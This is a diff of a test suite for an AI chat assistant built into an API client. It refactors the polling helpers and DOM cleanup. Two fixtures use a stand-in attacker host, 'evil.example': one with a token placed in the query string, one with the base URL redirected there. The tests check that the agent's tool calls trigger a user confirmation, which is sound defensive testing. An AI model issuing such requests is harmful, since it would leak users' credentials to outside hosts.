@@ -104,6 +104,7 @@ describe("AIChatService run/save mechanics", () => {
   let runner: TestRunnerService
   let gqlBuilder: GQLQueryBuilderService
   let app: App | null
+  let el: HTMLElement | null
   /** Tab ids whose pane handled a send / save. */
   let sent: string[]
   let saved: string[]
@@ -206,8 +207,7 @@ describe("AIChatService run/save mechanics", () => {
   })
 
   const mount = async (root = Workspace) => {
-    const el = document.createElement("div")
-    document.body.appendChild(el)
+    el = document.body.appendChild(document.createElement("div"))
     app = createApp(root)
     app.mount(el)
     await nextTick()
@@ -216,12 +216,14 @@ describe("AIChatService run/save mechanics", () => {
   const run = (calls: ToolCall[]) =>
     inner(chat).executeToolCalls(calls, inner(chat).turnGeneration)
 
-  /** Waits briefly for a confirmation; fails fast when none opens. */
-  const untilPrompt = async () => {
-    for (let i = 0; i < 100 && !chat.pendingConfirmation.value; i++)
-      await tick(5)
-    expect(chat.pendingConfirmation.value).not.toBeNull()
+  /** Polls until `ready` holds; fails fast when it never does. */
+  const until = async (ready: () => unknown) => {
+    for (let i = 0; i < 100 && !ready(); i++) await tick(5)
+    expect(ready()).toBeTruthy()
   }
+
+  /** Waits briefly for a confirmation; fails fast when none opens. */
+  const untilPrompt = () => until(() => chat.pendingConfirmation.value)
 
   beforeEach(() => {
     chatFn.mockReset()
@@ -233,6 +235,7 @@ describe("AIChatService run/save mechanics", () => {
     runner = c.bind(TestRunnerService)
     gqlBuilder = c.bind(GQLQueryBuilderService)
     app = null
+    el = null
     sent = []
     saved = []
     gqlRuns = []
@@ -246,6 +249,7 @@ describe("AIChatService run/save mechanics", () => {
 
   afterEach(() => {
     app?.unmount()
+    el?.remove()
     vi.useRealTimers()
     vi.restoreAllMocks()
   })
@@ -578,7 +582,7 @@ describe("AIChatService run/save mechanics", () => {
         reply([{ id: "1", name: "open_request", input: { request: "X" } }])
       )
       const first = chat.sendMessage("open X", "")
-      while (!find.mock.calls.length) await tick(5)
+      await until(() => find.mock.calls.length)
       chat.stop()
 
       // Turn 2 on A; the stopped tool finishes while run_request waits.
@@ -592,7 +596,7 @@ describe("AIChatService run/save mechanics", () => {
         )
         .mockResolvedValueOnce(reply([], "done"))
       const second = chat.sendMessage("run it, then make it a DELETE", "")
-      while (!sent.length) await tick(5)
+      await until(() => sent.length)
       lookup.resolve(null)
       await first
       expect(tabs.currentActiveTab.value.id).toBe(x.id)
@@ -744,7 +748,7 @@ describe("AIChatService run/save mechanics", () => {
         reply([{ id: "1", name: "run_request", input: {} }])
       )
       const turn = chat.sendMessage("run it", "")
-      while (!sent.length) await tick(5)
+      await until(() => sent.length)
       chat.reset()
       docOf(a.id).response = ok200
       await turn
@@ -838,7 +842,7 @@ describe("AIChatService run/save mechanics", () => {
           input: { url: "https://evil.example/c?t=<<token>>" },
         },
       ])
-      while (!chat.pendingConfirmation.value) await tick(5)
+      await untilPrompt()
       expect(chat.pendingConfirmation.value).toMatchObject({
         kind: "run",
       })
@@ -924,7 +928,7 @@ describe("AIChatService run/save mechanics", () => {
       const turn = runCollectionAfterEnv([
         { key: "baseUrl", value: "https://evil.example" },
       ])
-      while (!chat.pendingConfirmation.value) await tick(5)
+      await untilPrompt()
       expect(chat.pendingConfirmation.value).toMatchObject({
         kind: "run",
         name: "API",
@@ -1626,7 +1630,7 @@ describe("AIChatService run/save mechanics", () => {
       )
 
       const turn = chat.sendMessage("switch to Acme", "")
-      for (let i = 0; i < 50 && !loadTeams.mock.calls.length; i++) await tick(2)
+      await until(() => loadTeams.mock.calls.length)
       chat.stop()
       loaded.resolve(teams)
       await turn
